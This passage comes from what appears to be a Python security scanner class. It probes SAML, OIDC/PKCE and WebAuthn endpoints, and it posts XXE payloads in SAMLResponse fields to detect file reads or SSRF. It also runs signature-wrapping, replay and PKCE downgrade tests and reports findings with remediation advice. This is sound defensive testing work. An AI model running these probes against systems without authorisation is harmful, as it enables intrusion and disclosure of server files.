                            "Validate clientDataJSON.origin against the expected RP origin (rpId) "
                            "on every assertion. Reject mismatched origins immediately."
                        ),
                    })
                    log.warning("[SAMLScanner] WebAuthn origin mismatch at %s", endpoint)
            except Exception as e:
                log.debug("[SAMLScanner] WebAuthn origin test error at %s: %s", endpoint, e)

        return findings

    def _test_webauthn_user_verification(
        self, webauthn_endpoints: list[tuple[str, str]]
    ) -> list[dict]:
        """Fetch WebAuthn options and check for userVerification=preferred weakness."""
        findings = []
        option_endpoints = [u for u, k in webauthn_endpoints
                            if "begin" in u or "login" in u or "authenticate" in u]

        for url in option_endpoints[:2]:
            if self._stopped():
                break
            try:
                time.sleep(self.rate_limit)
                r = self.session.post(url, json={}, timeout=self.timeout, verify=False)
                if r.status_code != 200:
                    continue
                if "application/json" not in r.headers.get("Content-Type", ""):
                    continue
                data = r.json()
                uv = (
                    data.get("userVerification")
                    or data.get("publicKey", {}).get("userVerification", "")
                )
                if uv and uv.lower() == "preferred":
                    findings.append({
                        **self._finding(
                            url=url,
                            vuln_type="webauthn_uv_preferred",
                            finding=(
                                "WebAuthn userVerification=preferred (not required). "
                                "Authenticators without PIN/biometric skip user verification, "
                                "weakening the phishing-resistance guarantee of FIDO2."
                            ),
                            severity="Medium",
                            proof=f"HTTP 200 | userVerification={uv}",
                            payload="userVerification=preferred",
                        ),
                        "method": "POST",
                        "param": "userVerification",
                        "cwe": "CWE-308",
                        "remediation": (
                            "Set userVerification=required in authentication options "
                            "to enforce PIN or biometric at every authentication ceremony."
                        ),
                    })
            except Exception as e:
                log.debug("[SAMLScanner] WebAuthn UV check error at %s: %s", url, e)

        return findings

    # ── Main scan ─────────────────────────────────────────────────────────────

    # ── SAML XXE ──────────────────────────────────────────────────────────────

    def _test_saml_xxe(self, acs_url: str) -> list[dict]:
        """Send DTD-based XXE payloads in SAMLResponse; detect file read or SSRF."""
        findings = []
        nonce = uuid.uuid4().hex[:8]

        probes = [
            ("xxe_file_read", _XXE_FILE_TEMPLATE.format(nonce=nonce, acs=acs_url), _XXE_FILE_INDICATORS),
            ("xxe_ssrf",      _XXE_SSRF_TEMPLATE.format(nonce=nonce, acs=acs_url), _XXE_SSRF_INDICATORS),
        ]

        for label, xml, indicators in probes:
            if self._stopped():
                break
            try:
                encoded = _b64enc(xml)
                time.sleep(self.rate_limit)
                r = self.session.post(
                    acs_url,
                    data={"SAMLResponse": encoded, "RelayState": "/"},
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False,
                )
                body = r.text
                matched = [ind for ind in indicators if ind in body]
                if matched:
                    findings.append(self._finding(
                        url=acs_url,
                        vuln_type="saml_xxe",
                        finding=(
                            f"SAML XXE ({label}) — XML external entity resolved; "
                            f"server response contains indicators: {matched}"
                        ),
                        severity="Critical",
                        proof=f"HTTP {r.status_code} | matched={matched} | body[:300]={body[:300]}",
                        payload=xml[:300],
                    ))
                    log.warning("[SAMLScanner] XXE %s confirmed at %s", label, acs_url)
            except Exception as e:
                log.debug("[SAMLScanner] XXE %s error at %s: %s", label, acs_url, e)

        return findings

    def scan(self, sitemap_pages: dict | None = None) -> list[dict]:
        """
        Run full SAML/OIDC/PKCE/WebAuthn scan. Returns list of finding dicts.
        """
        findings: list[dict] = []
        pages = sitemap_pages or {}

        # 1. Discover ACS endpoints
        acs_urls = self._discover_acs()
        log.info("[SAMLScanner] Found %d ACS candidates", len(acs_urls))

        # 2. XSW attacks + replay + recipient mismatch on each ACS
        for acs_url in acs_urls[:4]:  # cap at 4 endpoints × (XSW + replay + mismatch + XXE)
            if self._stopped():
                break
            findings += self._test_xsw(acs_url)
            if self._stopped():
                break
            findings += self._test_replay(acs_url)
            if self._stopped():
                break
            findings += self._test_recipient_mismatch(acs_url)
            if self._stopped():
                break
            findings += self._test_saml_xxe(acs_url)

        # 3. OIDC implicit flow (passive — no requests)
        if not self._stopped():
            findings += self._detect_oidc_implicit(pages)

        # 4. PKCE downgrade S256 → plain
        if not self._stopped():
            findings += self._test_pkce_downgrade(pages)

        # 5. PKCE absent — no code_challenge at all
        if not self._stopped():
            findings += self._test_pkce_absent(pages)

        # 6. WebAuthn / FIDO2
        if not self._stopped():
            webauthn_eps = self._discover_webauthn(sitemap_pages=sitemap_pages)
            if webauthn_eps:
                log.info("[SAMLScanner] Found %d WebAuthn candidates", len(webauthn_eps))
                findings += self._test_webauthn_password_fallback(webauthn_eps)
                if not self._stopped():
                    findings += self._test_webauthn_origin_mismatch(webauthn_eps)
                if not self._stopped():
                    findings += self._test_webauthn_user_verification(webauthn_eps)

        log.info("[SAMLScanner] Complete: %d findings", len(findings))
        return findings
